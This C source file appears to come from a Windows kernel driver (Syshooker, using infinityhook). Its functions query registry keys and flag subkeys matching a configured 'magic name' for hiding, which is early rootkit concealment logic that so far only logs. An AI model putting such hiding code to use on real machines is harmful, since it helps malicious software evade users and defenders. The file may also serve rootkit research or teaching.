#include "utils.h"
#include "stdafx.h"
#include "../Syshooker-Client/SyshookerCommon.h"
#include "Settings.h"

void PrintRegistryKeyHandleInformation(HANDLE KeyHandle, const wchar_t* CallingFunctionName) {
	// TODO - dynamic allocation
	PVOID KeyInformationBuffer[100] = { 0 };
	size_t BufferSize = 100 * sizeof(PVOID);
	ULONG ResLength = -1;
	NTSTATUS KeyResult = ZwQueryKey(KeyHandle, KeyNameInformation, KeyInformationBuffer, BufferSize, &ResLength);
	if (NT_SUCCESS(KeyResult)) {
		PKEY_NAME_INFORMATION KeyNamePtr = (PKEY_NAME_INFORMATION)KeyInformationBuffer;
		wchar_t HandleNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
		for (size_t i = 0; i < KeyNamePtr->NameLength / 2 && i < MAX_PATH_SYSHOOKER; ++i) {
			HandleNameBuffer[i] = KeyNamePtr->Name[i];
		}
		kprintf("[+] infinityhook: ZwQueryKey called from %ws: NameLength: %d, Name: %ws\n", CallingFunctionName, KeyNamePtr->NameLength, HandleNameBuffer);
	}
	else {
		kprintf("[-] infinityhook: ZwQueryKey not success: %x\n", KeyResult);
	}
}

// 
NTSTATUS RegistryKeyHideInformation(_In_ HANDLE KeyHandle, _Out_ PINT32 HideSubkeyIndexesCount, _Out_ PINT32 OkSubkeyIndexesCount, _Out_ PVOID OkSubkeyIndexes) {
    UNREFERENCED_PARAMETER(HideSubkeyIndexesCount);
    UNREFERENCED_PARAMETER(OkSubkeyIndexesCount);
    UNREFERENCED_PARAMETER(OkSubkeyIndexes);

    NTSTATUS status = -1;
    ULONG resultLength = 0;
    PKEY_FULL_INFORMATION keyInfo = NULL;
    PKEY_BASIC_INFORMATION subKeyInfo = NULL;

    // required buffer size
    status = ZwQueryKey(KeyHandle, KeyFullInformation, NULL, 0, &resultLength);
    if (status != STATUS_BUFFER_TOO_SMALL) {
        kprintf("[-] RegistryKeyHideInformation: Should not have happened.\n");
        return status;
    }

    // key information malloc
    keyInfo = (PKEY_FULL_INFORMATION)ExAllocatePool(NonPagedPool, resultLength);
    if (!keyInfo) {
        kprintf("[-] RegistryKeyHideInformation: Failed to allocate keyInfo buffer.\n");
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    // get subkey count information
    status = ZwQueryKey(KeyHandle, KeyFullInformation, keyInfo, resultLength, &resultLength);
    if (!NT_SUCCESS(status)) {
        ExFreePool(keyInfo);
        kprintf("[-] RegistryKeyHideInformation: ZwQueryKey call failed.\n");
        return status;
    }

    kprintf("[+] RegistryKeyHideInformation: ZwQueryKey subkeys count: %d.\n", keyInfo->SubKeys);
    ULONG SubKeysCount = keyInfo->SubKeys;
    ExFreePool(keyInfo);

    // Retrieve subkeys using ZwEnumerateKey
    ULONG index = 0;
    while (1) {
        // get buffer size
        status = ZwEnumerateKey(KeyHandle, index, KeyBasicInformation, NULL, 0, &resultLength);
        if (status == STATUS_NO_MORE_ENTRIES) {
            break;
        }
        else if (!NT_SUCCESS(status) && status != STATUS_BUFFER_TOO_SMALL) { // we want to see STATUS_BUFFER_TOO_SMALL
            kprintf("[-] RegistryKeyHideInformation: ZwEnumerateKey call failed %x.\n", status);
            return status;
        }

        subKeyInfo = (PKEY_BASIC_INFORMATION)ExAllocatePool(NonPagedPool, resultLength);
        if (!subKeyInfo) {
            kprintf("[-] RegistryKeyHideInformation: Failed to allocate subKeyInfo buffer.\n");
            return STATUS_INSUFFICIENT_RESOURCES;
        }

        status = ZwEnumerateKey(KeyHandle, index, KeyBasicInformation, subKeyInfo, resultLength, &resultLength);
        if (NT_SUCCESS(status)) {
            
            // validate if this key is OK or not
            wchar_t SubKeyNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };

            // ->NameLength / 2 , because the field is size in bytes but contains wchars (which consist of 2 bytes each)
            for (size_t i = 0; i < subKeyInfo->NameLength / 2 && i < MAX_PATH_SYSHOOKER; ++i) {
                SubKeyNameBuffer[i] = subKeyInfo->Name[i];
            }

            // TODO? - better function that evaluates whether a subkey should be hidden?
            if (wcsstr(SubKeyNameBuffer, Settings.RegistryKeyMagicName)) {
                kprintf("[+] RegistryKeyHideInformation (SHOULD HIDE): subKey index %d: %ws\n", index, SubKeyNameBuffer);
            }
            else {
                kprintf("[+] RegistryKeyHideInformation: subKey index %d: %ws\n", index, SubKeyNameBuffer);
            }
        }
        else {
            kprintf("[-] RegistryKeyHideInformation: Second call to ZwEnumerateKey failed (index %d). Shouuld not have happened...\n", index);
            ExFreePool(subKeyInfo);
            return status;
        }

        ExFreePool(subKeyInfo);
        index++;
    };

    return STATUS_SUCCESS;
}